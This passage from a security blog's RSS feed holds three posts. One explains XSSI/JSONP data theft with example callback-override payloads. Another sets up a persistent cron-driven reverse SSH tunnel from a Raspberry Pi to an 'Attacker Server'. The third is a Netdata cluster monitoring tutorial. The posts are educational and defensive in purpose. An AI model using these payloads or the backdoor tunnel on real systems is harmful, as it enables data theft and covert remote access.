&lt;p&gt;So site A includes a script pointing to &lt;a href=&quot;http://b/userdata.js&quot;&gt;http://B/userdata.js&lt;/a&gt; which is something like:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;displayMySecretData({&quot;secret&quot;:&quot;this is very secret&quot;, ...})
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;So A defines a function called displayMySecretData, and when the included script from server B runs, it calls that function and displays the secret data to the user.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Now evil server E comes along. It sees that A is including data from B using JSONP. So server E includes the same script, but defines its own displayMySecretData which instead steals the data. The attacker then tricks the user into visiting his site. When the user goes there and he is logged in to B, the browser automatically sends the authentication cookies for B along with the request to fecth the script from B. B sees an authenticated user, and thus returns the script as expected. E gets the data, and presto…&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;how-to-exploit-xssi-&quot;&gt;How to exploit XSSI ?&lt;/h2&gt;

&lt;p&gt;Often scripts included can contains sensitive information in the global variables, allowing an attacker to potentially read all the secret data.&lt;/p&gt;

&lt;p&gt;Some scripts (when requested with cookie, and so the user is authenticated) reply with a different code than when a user make the same request without cookie aside (un-authenticated).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Dynamic-Authenticated-Javascript-based-XSSI&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.owasp.org/images/9/9a/20160607-xssi-the_tale_of_a_fameless_but_widepsread_vulnerability-Veit_Hailperin.pdf&quot;&gt;https://www.owasp.org/images/9/9a/20160607-xssi-the_tale_of_a_fameless_but_widepsread_vulnerability-Veit_Hailperin.pdf&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://bestrockers.ddns.net/res/XSSI.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Reading variables&lt;/li&gt;
  &lt;li&gt;Overriding functions
    &lt;ol&gt;
      &lt;li&gt;If sensitive content is directly put into the web page global variables, one method to retrieve that data is simply to ask for it.&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Example:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;`&amp;lt;script src=&quot;[https://www.vulnerable-domain.tld/script.js](https://www.vulnerable-domain.tld/script.js)&quot;&amp;gt;&amp;lt;/script&amp;gt;`
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;has a variable like:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;keys = [ domain: 'live.com', apiKey: 'dsd2kgijland3io1', privkey:' *rsa key*',  ... ]&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Then an attacker could just inject an&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;`alert(JSON.stringify(keys))`
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;to retrieve all the secrets.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Override a function which could display user data using JSONP callback.&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;where-is-the-vulnerability&quot;&gt;&lt;strong&gt;WHERE IS THE VULNERABILITY?&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;If the attacker can OVERRIDE a javascript function then he can read all the data returned by an external source (possibly with authenticated content)!!&lt;/p&gt;

&lt;p&gt;So for example if Angular JS does have a function like this which handle sensitive information:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;`angular.callbacks._7({&quot;status&quot;:STATUS,&quot;body&quot;:{&quot;demographics&quot;:{&quot;email&quot;:......}}})`
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;then an attacker could inject:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-&amp;lt;script&amp;gt;&quot;&gt;          var angular = function () { return 1; };
          angular.callbacks = function () { return 1; };      
          angular.callbacks._7 = function (leaked) {
    			  alert(JSON.stringify(leaked));
          };  
    &amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Before the inclusion of the external script.&lt;/p&gt;

&lt;p&gt;We could suppose the server is dynamically generating javascript code. How does he know which function to use? We could suppose this is passeb by GET requests?&lt;/p&gt;

&lt;p&gt;For example if the function needed is myFunc then the script will be:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;`&amp;lt;script src=&quot;https://site.tld/p?jsonp=myFunc&quot; type=&quot;text/javascript&quot;&amp;gt;&amp;lt;/script&amp;gt;`
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The function myFunc will be used as callback as soon as data is returned.&lt;/p&gt;

&lt;p&gt;What if an attacker can change the requesting callback and then writes his own in the victim browser? like this?&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;```
&amp;lt;script&amp;gt;
      leak = function (leaked) {
			  alert(JSON.stringify(leaked));
      };  
&amp;lt;/script&amp;gt;
&amp;lt;script src=&quot;https://site.tld/p?jsonp=leak&quot; type=&quot;text/javascript&quot;&amp;gt;&amp;lt;/script&amp;gt;
```
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;protection-from-xssi&quot;&gt;PROTECTION FROM XSSI&lt;/h2&gt;

&lt;p&gt;Never put sensitive content on Javascript and JSONP.&lt;/p&gt;

&lt;p&gt;Instruct the browser not to guess the &lt;code class=&quot;highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt; with:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;X-Content-Type-Options: nosniff
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;A correct Content-Type is also helpful in reducing the chance of XSSI.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Please feel free to make any comment! If anything is unclear, just write in the comment and I will update the post!Thanks for reading!&lt;/strong&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 23 Apr 2018 00:00:00 +0200</pubDate>
        <link>https://carloalbertoscola.it//2018/notes/xssi-and-xss/</link>
        <guid isPermaLink="true">https://carloalbertoscola.it//2018/notes/xssi-and-xss/</guid>
        
        
        <category>notes</category>
        
      </item>
    
      <item>
        <title>SSH Reverse Tunnel - Raspberry Pi</title>
        <description>&lt;h1 id=&quot;persistent-reverse-ssh-tunnel&quot;&gt;Persistent Reverse-SSH Tunnel&lt;/h1&gt;
&lt;p&gt;&lt;em&gt;Last modified:&lt;/em&gt; 17 January 2019&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/ssh-tunnel.png&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h2 id=&quot;prerequisites&quot;&gt;Prerequisites:&lt;/h2&gt;
&lt;p&gt;Example:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;user &lt;em&gt;pi&lt;/em&gt; on the Raspberry.&lt;/li&gt;
  &lt;li&gt;user &lt;em&gt;lobs&lt;/em&gt; on the Attacker Server.&lt;/li&gt;
  &lt;li&gt;SSH server running on both.
    &lt;h2 id=&quot;from-the-raspberry&quot;&gt;From the Raspberry:&lt;/h2&gt;
  &lt;/li&gt;
  &lt;li&gt;Copy the RSA key to the Server with:&lt;/li&gt;
&lt;/ul&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;ssh-copy-id -i .ssh/id_rsa.pub lobs@AttackerServer.domain&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;If id_rsa.pub doesn’t already exists then:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;ssh-keygen&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;ul&gt;
  &lt;li&gt;The command to launch is:&lt;/li&gt;
&lt;/ul&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;ssh -p 30022 -N -R 2222:localhost:22 pi@AttackerServer.domain&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This will ssh the Raspberry to the Attacker Server without specifying any command (-N) and tell the server to redirect ssh connection from local (server) port 2222 to remote (raspberry) port 22 (or whatever you want).&lt;/p&gt;

&lt;p&gt;After that, on the Attacker Server there will be a ssh socket listening on port 2222 ready to redirect ssh traffic to Raspberry through port 22.&lt;/p&gt;

&lt;p&gt;You can always set up the raspberry to serve ssh connections on port 80 or 443 in order to avoid firewall issues. It depends on the firewall configurations.&lt;/p&gt;

&lt;h2 id=&quot;the-attacker&quot;&gt;The Attacker&lt;/h2&gt;

&lt;p&gt;The attacker just need to:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;SSH into his server on port 30022.&lt;/li&gt;
  &lt;li&gt;Run the command:&lt;/li&gt;
&lt;/ol&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;ssh -p 2222 -l lobs localhost&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;automation-and-persistence&quot;&gt;&lt;strong&gt;Automation and Persistence&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;A script can be put in the crontab to check periodically for connection to a remote server.&lt;/p&gt;

&lt;p&gt;The &lt;a href=&quot;https://github.com/bestrocker221/serverstuff/blob/master/new_ssh_reverse_tunnel.sh&quot;&gt;new_ssh_reverse_tunnel.sh&lt;/a&gt; is also available in my GitHub account.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
createTunnel&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
  /usr/bin/ssh -N -R 2222:localhost:22 pi@AttackerServer.domain
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt; -eq 0 &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;; &lt;span class=&quot;k&quot;&gt;then
    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;Tunnel created successfully
  &lt;span class=&quot;k&quot;&gt;else
    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;An error occurred creating a tunnel. ReturnCode is &lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
/bin/pidof ssh
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt; -ne 0 &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;; &lt;span class=&quot;k&quot;&gt;then
  &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;Creating new tunnel ...
  createTunnel
&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Copy the script &lt;strong&gt;new_ssh_tunnel.sh&lt;/strong&gt; in the &lt;em&gt;/etc/cron.d/&lt;/em&gt; folder.&lt;/p&gt;

&lt;p&gt;To edit the crontab run: &lt;strong&gt;(Do not edit the crontab file directly)&lt;/strong&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;crontab -e&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And add at the end:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nano&quot; data-lang=&quot;nano&quot;&gt;*/5 * * * * /etc/cron.d/new_ssh_tunnel.sh 2&amp;gt; /dev/null&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Every 5 minutes it will check for the tunnel to create.&lt;/p&gt;

&lt;h3 id=&quot;considerations&quot;&gt;&lt;strong&gt;Considerations&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;This way if the Raspberry falls under someone’s else hands it has full access on the AttackerServer. If it has served its aim then you should remove the rsa key from the authorized_key on the server.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Please feel free to make any comment! If anything is unclear, just write in the comment and I will update the post!Thanks for reading!&lt;/strong&gt;&lt;/p&gt;
</description>
        <pubDate>Tue, 13 Mar 2018 00:00:00 +0100</pubDate>
        <link>https://carloalbertoscola.it//2018/linux/security/ssh-reverse-tunnel/</link>
        <guid isPermaLink="true">https://carloalbertoscola.it//2018/linux/security/ssh-reverse-tunnel/</guid>
        
        
        <category>linux</category>
        
        <category>security</category>
        
      </item>
    
      <item>
        <title>Netdata cluster - Monitoring multiple server.</title>
        <description>&lt;h1 id=&quot;one-dashboard-multiple-server-monitoring&quot;&gt;One Dashboard, multiple server monitoring.&lt;/h1&gt;

&lt;h2 id=&quot;password-protected-useful-dashboard&quot;&gt;Password protected useful dashboard.&lt;/h2&gt;

&lt;h3 id=&quot;aggregate-multiple-server-netdata-logs-into-one-protected-page&quot;&gt;Aggregate multiple server netdata logs into one protected page.&lt;/h3&gt;
&lt;p&gt;How to set up a netdata cluster monitoring multiple servers. One dashboard, multiple server monitoring instances.&lt;/p&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/netdata-tv.jpg&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;what-do-we-want&quot;&gt;&lt;strong&gt;What do we want?&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;The aim of this tutorial is to allow the monitoring of multiple Linux server through one single and password protected dashboard. It is possible to add as many server and graph as you want.&lt;/p&gt;

&lt;p&gt;I’m going to describe a use-case where you are using a free dynamic DNS service like &lt;a href=&quot;https://www.noip.com&quot;&gt;no-ip&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;netdata-dashboard&quot;&gt;Netdata Dashboard&lt;/h2&gt;

&lt;p&gt;We want each server to serve netdata webpage on &lt;em&gt;/netdata/&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;We need to choose a server which will host the netdata dashboard.&lt;/p&gt;

&lt;p&gt;Remember: every web server must be configured to use SSL/TLS in order to work.&lt;/p&gt;

&lt;p&gt;Example: We have:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Raspberry Pi with &lt;em&gt;domain *myraspi.com&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;Server 1 with domain &lt;em&gt;srv1.com&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;Server 2 with domain &lt;em&gt;srv2.com&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;…&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;We want:&lt;/p&gt;

&lt;dl&gt;
  &lt;dt&gt;Raspberry Pi (netdata collector)&lt;/dt&gt;
  &lt;dd&gt;&lt;em&gt;myraspi.com/netdata/&lt;/em&gt; (permit only to myraspi.com)&lt;/dd&gt;
  &lt;dd&gt;&lt;em&gt;myraspi.com/netdata-cluster/dashboard.html&lt;/em&gt; (password protected)&lt;/dd&gt;
  &lt;dt&gt;Server1&lt;/dt&gt;
  &lt;dd&gt;&lt;em&gt;srv1.com/netdata/&lt;/em&gt; (permit only to myraspi.com)&lt;/dd&gt;
  &lt;dt&gt;Server2&lt;/dt&gt;
  &lt;dd&gt;&lt;em&gt;srv2.com/netdata/&lt;/em&gt; (permit only to myraspi.com)&lt;/dd&gt;
&lt;/dl&gt;

&lt;h3 id=&quot;netdata-installation&quot;&gt;&lt;strong&gt;Netdata installation&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;We need to install netdata on each one the same way, and then decide which one will host the dashboard. In my case i used the Raspberry Pi.&lt;/p&gt;

&lt;p&gt;For this you can have a quick look at “Installation” section in &lt;a href=&quot;/linux/web/2018/02/15/netdata-ubuntu.html&quot;&gt;Setting Netdata server monitoring with password authentication on Apache proxy.&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I assume you have already enabled HTTPS in each server, in case you have to do it. You can find here all the instructions &lt;a href=&quot;/linux/web/2018/02/15/apache-ssl-tls-domain.html&quot;&gt;Configuring a new SSL/TLS domain on Apache2&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;apache-configuration&quot;&gt;Apache configuration&lt;/h3&gt;

&lt;p&gt;Create a directory on the raspi which will contain the dashboard.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;sudo mkdir /var/www/netdata-cluster&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt; We first need to install some modules for Apache: &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;sudo apt install libxml2-dev libapache2-mod-proxy-html&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt; Then we need to activate the mods: &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;sudo a2enmod proxy
&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;sudo a2enmod proxy_html
&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;sudo a2enmod proxy_http
&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;sudo a2enmod xml2enc&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Open the default &lt;em&gt;vhost&lt;/em&gt; file for the HTTPS domain and add these lines at the end right before the enclosing VirtualHost tag.&lt;/p&gt;

&lt;p&gt;In my case the config file is &lt;em&gt;/etc/apache2/sites-available/default-ssl.conf&lt;/em&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;        RewriteEngine On
        ProxyRequests Off
        ProxyPreserveHost on

        &amp;lt;location /netdata/ &amp;gt;
               Require host &amp;lt;YOUR DASHBOARD HOSTING DOMAIN&amp;gt;  //e.g. myraspi.com
        &amp;lt;/location&amp;gt;

       &amp;lt;proxy&amp;gt;
            Order allow,deny
            Allow from all
       &amp;lt;/proxy&amp;gt;
       &amp;lt;location /netdata-cluster/&amp;gt;
                AuthType Basic
                AuthName &lt;span class=&quot;s2&quot;&gt;&quot;Restricted Content&quot;&lt;/span&gt;
                AuthUserFile /etc/apache2/.htpasswd
                Require valid-user
                Order deny,allow
                Allow from all
        &amp;lt;/location&amp;gt;
        &amp;lt;Directory /netdata/ &amp;gt;
                Options -Indexes +FollowSymLinks
                AllowOverride all
                Order deny,allow
                Deny from all
       &amp;lt;/Directory&amp;gt;

        ProxyPass &lt;span class=&quot;s2&quot;&gt;&quot;/netdata/&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://127.0.0.1:19999/&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;connectiontimeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;5 &lt;span class=&quot;nv&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;30
        ProxyPassReverse &lt;span class=&quot;s2&quot;&gt;&quot;/netdata/&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://127.0.0.1:19999/&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Verify the sintax is correct with:  (should return &lt;em&gt;Syntax OK&lt;/em&gt;)&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;apachectl configtest&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we are going to create the credentials for accessing the dashboard page&lt;/p&gt;

&lt;p&gt;Install apache2-utils if you don’t have already and create a netdata user&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;sudo apt install apache2-utils
&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;sudo htpasswd -c /etc/apache2/.htpasswd netdata&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;You have to insert the password for the user ‘netdata’ twice.&lt;/p&gt;

&lt;p&gt;And restart apache.&lt;/p&gt;

&lt;h3 id=&quot;netdata-dashboard-1&quot;&gt;&lt;strong&gt;Netdata Dashboard&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;Create a file into &lt;em&gt;/var/www/netdata-cluster/dashboard.html&lt;/em&gt;, this will be your netdata collector.&lt;/p&gt;

&lt;p&gt;Here is an example provided by Netdata &lt;a href=&quot;https://github.com/firehol/netdata/blob/master/web/tv.html&quot;&gt;tv.html&lt;/a&gt;. You can copy it into your dashboard.html.
It provide a simple example with some graph in comparison from 2 different server. We are going to load data from &lt;em&gt;myraspi&lt;/em&gt;.com and &lt;em&gt;srv1.com&lt;/em&gt;. You can add as many as you want.&lt;/p&gt;

&lt;h4 id=&quot;configuring-dashboard-to-get-data-from-servers&quot;&gt;&lt;strong&gt;Configuring dashboard to get data from servers&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;Very simple.&lt;/p&gt;

&lt;p&gt;In &lt;em&gt;dashboard.html&lt;/em&gt; the first thing to do is to load a dashboard Javascript file located in the Netdata collector (raspi).&lt;/p&gt;

&lt;p&gt;Modify near row 52 the  html script tag … to:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/javascript&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://myraspi.com/netdata/dashboard.js&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The rest of the file include two graph for every row in which if you don’t specify the &lt;strong&gt;data-host&lt;/strong&gt; value, netdata will set the default one (myraspi).&lt;/p&gt;

&lt;p&gt;Every graph starts with e.g&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;data-netdata=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;system.io&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;..&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;where &lt;em&gt;system.io&lt;/em&gt; is the identification name of the graph.&lt;/p&gt;

&lt;p&gt;All you need to do is to add/modify the line below:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;data-host=&quot;http://registry.my-netdata.io&quot;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;To:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;data-host=&quot;https://srv1.com/netdata/&quot;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;for every graph (1 per row) in the file.&lt;/p&gt;

&lt;p&gt;Results!&lt;/p&gt;
&lt;figure&gt;
&lt;img src=&quot;/assets/netdata-tv2.jpg&quot; alt=&quot;cropped screen view of netdata dashboard&quot; /&gt;
&lt;figcaption align=&quot;center&quot;&gt;Left is srv1.com and right is myraspi.com&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h3 id=&quot;security&quot;&gt;&lt;strong&gt;Security&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;For now we have made all traffic go through HTTPS and made the dashboard page password protected.. but&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Access to page &lt;em&gt;/netdata/&lt;/em&gt; is protected by Apache require host directive, but the IP/domain reverse lookup need to be addressed.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This because for some access restriction Apache will need to do a reverse lookup to check for the IP to hostname match and viceversa.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;This configuration will cause Apache to perform a double reverse DNS lookup on the client IP address, regardless of the setting of the HostnameLookups directive. It will do a reverse DNS lookup on the IP address to find the associated hostname, and then do a forward lookup on the hostname to assure that it matches the original IP address. Only if the forward and reverse DNS are consistent and the hostname matches will access be allowed.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Ref: &lt;a href=&quot;https://httpd.apache.org/docs/2.4/mod/mod_authz_host.html&quot;&gt;https://httpd.apache.org/docs/2.4/mod/mod_authz_host.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The only way to allow Apache Require directive to work properly is to maintain updated an entry in the hosts file. We need to do this because free dynamic dns service does not provide a DNS PTR record so reverse lookup will always fail and apache will not be able to use its directives to protect the &lt;em&gt;/netdata/&lt;/em&gt; folder path.&lt;/p&gt;

&lt;p&gt;Here is the script &lt;a href=&quot;https://github.com/bestrocker221/serverstuff/blob/master/update-hosts.sh&quot;&gt;update-hosts.sh&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Open the file and edit the field DOMAIN to:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;DOMAIN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;myraspi.com&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;You need to copy it into your /etc/cron.d folder and then setup a hourly cron job: (as root user)&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;crontab -e&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now add at the end of the file:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;@hourly root /etc/cron.d/update_iptables_domain_rule.sh&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now the script will automatically refresh the hosts file so that you don’t have to worry about the dynamic IP changes.&lt;/p&gt;

&lt;p&gt;This way only the traffic from (-s) &lt;em&gt;myraspi.com&lt;/em&gt; will be allowed to access /netdata/ folder.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Please feel free to make any comment! If anything is unclear, just write in the comment and I will update the post!Thanks for reading!&lt;/strong&gt;&lt;/p&gt;
</description>
        <pubDate>Sun, 18 Feb 2018 00:00:00 +0100</pubDate>
        <link>https://carloalbertoscola.it//2018/linux/web/netdata-cluster/</link>
        <guid isPermaLink="true">https://carloalbertoscola.it//2018/linux/web/netdata-cluster/</guid>
        
        
        <category>linux</category>
        
        <category>web</category>
        
      </item>
    
  </channel>
</rss>
